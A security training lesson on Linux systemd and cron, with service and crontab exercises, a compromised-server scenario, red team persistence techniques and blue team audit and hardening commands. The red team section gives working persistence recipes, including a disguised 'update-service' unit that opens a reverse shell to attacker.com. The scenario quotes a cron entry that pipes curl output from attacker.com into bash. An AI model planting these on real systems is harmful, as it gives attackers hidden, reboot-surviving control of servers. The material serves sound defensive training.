1. Theory Section
Systemd · unit files · cron syntax · at

What is systemd?

Systemd is the init system — PID 1 — on virtually all modern Linux distributions. It starts and manages all services, mounts filesystems, and brings the system to a usable state after boot. Everything that runs persistently on a Linux server is managed by systemd as a unit.

Unit
The basic object systemd manages. Can be a service, socket, timer, mount, device, or target.
Service unit (.service)
Defines how to start, stop, and restart a daemon (e.g. SSH, Apache, Nginx).
Target (.target)
Groups of units. multi-user.target = normal boot. Similar to old runlevels.
Timer (.timer)
Systemd's alternative to cron — schedules tasks. More powerful and better logging than cron.

Unit file structure — what a service looks like

[Unit] Description=My Custom Service After=network.target # start after network is up Wants=network-online.target [Service] Type=simple User=nobody # run as non-root service account (least privilege) ExecStart=/usr/bin/myapp # command to start the service ExecStop=/bin/kill -s QUIT $MAINPID Restart=on-failure # restart if it crashes RestartSec=5s [Install] WantedBy=multi-user.target # enable at normal boot

Unit file locations — know these for auditing

/lib/systemd/system/
Default units from installed packages. Do not edit — may be overwritten on updates.
/etc/systemd/system/
System administrator customisations and new units. These override /lib/systemd/system/. Attackers plant backdoor units here.
/run/systemd/system/
Transient units created at runtime. Disappear on reboot.
~/.config/systemd/user/
Per-user units run without root. Attackers use these for user-level persistence that survives login.

Cron — scheduled task system

Cron runs commands on a schedule. Each line in a crontab is a task. Understanding the syntax is mandatory — it appears constantly in CTFs, post-exploitation, and log analysis.

*minute (0–59)
*hour (0–23)
*day of month (1–31)
*month (1–12)
*day of week (0–7)
/path/cmdcommand to run
*/5 * * * * /tmp/backup.sh # every 5 minutes 0 2 * * * /usr/bin/backup.sh # daily at 02:00 0 0 * * 0 /scripts/weekly.sh # every Sunday at midnight @reboot /usr/local/bin/startup.sh # run once at system boot @hourly /usr/bin/check.sh # every hour (shorthand)

Cron file locations — all must be audited

/etc/crontab
System-wide crontab. Has an extra USER field before the command. Edited directly.
/etc/cron.d/
Drop-in cron files from packages. Same format as /etc/crontab with USER field.
/etc/cron.hourly/
Scripts placed here run once per hour. No schedule line needed — just drop the script in.
/etc/cron.daily/
Scripts run once per day.
/var/spool/cron/crontabs/
Per-user crontabs set with crontab -e. One file per user. Root-readable.

2. Practical Section
systemctl · journalctl · crontab · timers

Exercise 1 — systemctl service management

systemctl status ssh # status of SSH service systemctl status --all | head -40 # overview of all units systemctl list-units --type=service # all active services systemctl list-units --type=service --state=running # only running services systemctl list-unit-files --type=service # all installed services + enabled state systemctl is-active ssh # quick active check (exit code 0 = active) systemctl is-enabled ssh # will it start at boot?

Exercise 2 — start, stop, enable, disable

sudo systemctl start ssh # start now sudo systemctl stop ssh # stop now sudo systemctl restart ssh # stop then start sudo systemctl reload ssh # reload config without full restart (SIGHUP) sudo systemctl enable ssh # start at boot (creates symlink in /etc/systemd/system) sudo systemctl disable ssh # remove from boot sudo systemctl enable --now ssh # enable AND start immediately (most useful)

Exercise 3 — journalctl log reading

journalctl # all logs since boot journalctl -u ssh # logs for SSH service only journalctl -u ssh -f # follow live SSH log journalctl -u ssh --since "1 hour ago" journalctl -u ssh --since "2024-01-01" --until "2024-01-02" journalctl -p err # only error-level and above journalctl -p err -b # errors from current boot only journalctl --disk-usage # how much space logs are using journalctl -b -1 # logs from the previous boot (useful after crashes)

Exercise 4 — inspect unit files directly

systemctl cat ssh # view the full unit file systemctl cat cron # view cron's unit file ls /etc/systemd/system/ # custom/added unit files (audit these) ls /lib/systemd/system/ # package-installed unit files find /etc/systemd/system/ -name "*.service" -newer /etc/passwd # unit files newer than /etc/passwd — recently added (persistence indicator)

Exercise 5 — crontab management

crontab -l # list your cron jobs crontab -e # edit your crontab (opens in editor) crontab -l -u root # list root's crontab (needs sudo) sudo crontab -l -u www-data # list www-data's crontab cat /etc/crontab # system-wide crontab ls -la /etc/cron.d/ # drop-in cron files ls -la /etc/cron.hourly/ # hourly scripts ls -la /etc/cron.daily/ # daily scripts ls -la /var/spool/cron/crontabs/ # all per-user crontabs (root readable)

Exercise 6 — write and test your own service + cron

cat > /tmp/hello-service.sh << 'EOF' #!/bin/bash echo "Service started at $(date)" >> /tmp/hello.log sleep infinity EOF chmod +x /tmp/hello-service.sh sudo tee /etc/systemd/system/hello.service << 'EOF' [Unit] Description=Hello test service [Service] ExecStart=/tmp/hello-service.sh Restart=on-failure [Install] WantedBy=multi-user.target EOF sudo systemctl daemon-reload # reload unit file index sudo systemctl start hello sudo systemctl status hello journalctl -u hello -f # watch it live sudo systemctl stop hello sudo rm /etc/systemd/system/hello.service sudo systemctl daemon-reload # clean up
3. Real-World Scenario
Cron + systemd persistence survives server reboot

A defender investigates a compromised server. The attacker was ejected after their initial reverse shell was killed — but within 10 minutes they are back. The server was even rebooted and the attacker is still present.

Layer 1 — cron persistence

The defender checks crontab -l -u www-data and finds a hidden entry: */5 * * * * /tmp/.update curl http://attacker.com/shell.sh | bash. Every 5 minutes the server downloads and executes a fresh payload. Killing the process alone never fixed anything — the cron job relaunched it.

Layer 2 — systemd persistence (survives reboots)

After removing the cron entry, the attacker is still back after a reboot. The defender runs ls -lat /etc/systemd/system/ and spots a file called network-monitor.service created 2 days ago — right when the breach happened. systemctl cat network-monitor reveals it runs a reverse shell at boot.

Layer 3 — user-level systemd timer

Even after removing the system service, persistence returns. The attacker also installed a user-level timer in ~/.config/systemd/user/ for the www-data account that requires no root and persists across reboots for that user.

Defender lesson

Full persistence removal requires checking: all crontab locations, /etc/systemd/system/ for new service files, ~/.config/systemd/user/ for all users, /etc/cron.d/, and @reboot entries. Removing just the active shell is almost never sufficient.

4. Red Team Perspective
Persistence via cron and systemd — the two most common Linux techniques

Persistence — why it matters

Initial access can be fragile — a process crash, a session timeout, or a reboot will end it. Persistence mechanisms survive these events. Cron and systemd are the two most common Linux persistence techniques because they are built-in, trusted, and often not carefully monitored.

Cron-based persistence

(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.payload") | crontab - # adds to existing crontab without overwriting it — safer than crontab -e crontab -l -u www-data # check what's already there before adding # system-level (requires write to /etc/cron.d/ — needs root or path traversal) echo "*/5 * * * * root /tmp/.payload" > /etc/cron.d/system-update

Systemd service persistence (requires root)

cat > /etc/systemd/system/update-service.service << 'EOF' [Unit] Description=System Update Service [Service] Type=simple ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' Restart=always RestartSec=30 [Install] WantedBy=multi-user.target EOF systemctl enable --now update-service

User-level systemd timer (no root needed)

mkdir -p ~/.config/systemd/user/ cat > ~/.config/systemd/user/update.service << 'EOF' [Unit] Description=Update [Service] ExecStart=/bin/bash /home/user/.local/.payload.sh EOF cat > ~/.config/systemd/user/update.timer << 'EOF' [Unit] Description=Update timer [Timer] OnBootSec=60s OnUnitActiveSec=5m [Install] WantedBy=timers.target EOF systemctl --user enable --now update.timer

Service enumeration for attack opportunities

systemctl list-units --type=service --state=running # what's running? systemctl list-unit-files | grep enabled # what starts at boot? ps aux | grep -v "\[" | awk '{print $11}' | sort -u # all running binary paths find /etc/systemd/system/ -name "*.service" | xargs grep -l "ExecStart" # what command does each custom service run?
5. Blue Team Perspective
Audit persistence · Harden cron · Monitor units

Complete persistence audit checklist

for user in $(cut -d: -f1 /etc/passwd); do echo "=== crontab: $user ===" crontab -l -u $user 2>/dev/null done cat /etc/crontab ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ ls -la /var/spool/cron/crontabs/ find /etc/systemd/system/ -name "*.service" -newer /etc/passwd find /etc/systemd/system/ -name "*.timer" find /home -path "*/.config/systemd/user/*.service" 2>/dev/null find /root -path "*/.config/systemd/user/*.service" 2>/dev/null

Detect suspicious service content

grep -r "ExecStart" /etc/systemd/system/ | grep -vE "^Binary" \ | grep -iE "/tmp|/dev/shm|curl|wget|bash -c|nc |python|perl" # services that run from suspicious locations or use network tools

Monitor for new unit files with auditd

auditctl -w /etc/systemd/system/ -p wa -k systemd_changes auditctl -w /etc/cron.d/ -p wa -k cron_changes auditctl -w /var/spool/cron/ -p wa -k cron_user_changes ausearch -k systemd_changes # alert on any new service files ausearch -k cron_changes # alert on cron directory writes

Harden cron access

echo "root" > /etc/cron.allow # only root can use cron echo "ALL" > /etc/cron.deny # deny all others (cron.allow takes precedence) chmod 700 /var/spool/cron/crontabs # restrict crontab directory chmod 600 /etc/crontab # restrict system crontab

Disable and remove suspicious services cleanly

sudo systemctl stop suspicious.service sudo systemctl disable suspicious.service sudo rm /etc/systemd/system/suspicious.service sudo systemctl daemon-reload sudo systemctl reset-failed # clear error state from removed unit

10. Pro Tips & Mindset
What professionals know about services and persistence

Bookmark crontab.guru and use it every single time you encounter a cron expression. Do not try to decode */15 2-6 * * 1-5 in your head. Even experienced sysadmins use crontab.guru. Speed and accuracy matter more than mental arithmetic.

journalctl -u servicename -f is your best friend when debugging a new service. The -f flag follows in real time — you see log output the moment it's written. Combined with systemctl status in another terminal, you can diagnose most service issues in under a minute.

Always run systemctl daemon-reload after creating or editing a unit file. Without it, systemd uses its in-memory cache and ignores your changes entirely. This trips up beginners and experienced sysadmins alike — it is a mandatory step, not optional.

Common mistake: editing a unit file directly in /lib/systemd/system/. These files are owned by packages and will be overwritten on updates. Always copy to /etc/systemd/system/ first (or use systemctl edit servicename which handles this for you) before making changes.

Common mistake: thinking crontab -r is crontab -e. The -r flag removes the entire crontab without confirmation. One mistyped character and all cron jobs are gone. Always double-check before running any crontab command with a destructive flag.

Pro mindset: when investigating a persistence mechanism, always ask "what maintains this?" before removing it. A cron job that downloads a payload needs its outbound connection blocked at the firewall — not just the cron entry removed. A service that re-installs itself from a dropper script needs the dropper found and removed first. Remove the maintenance mechanism before the visible artefact, or the attacker will re-establish within minutes.
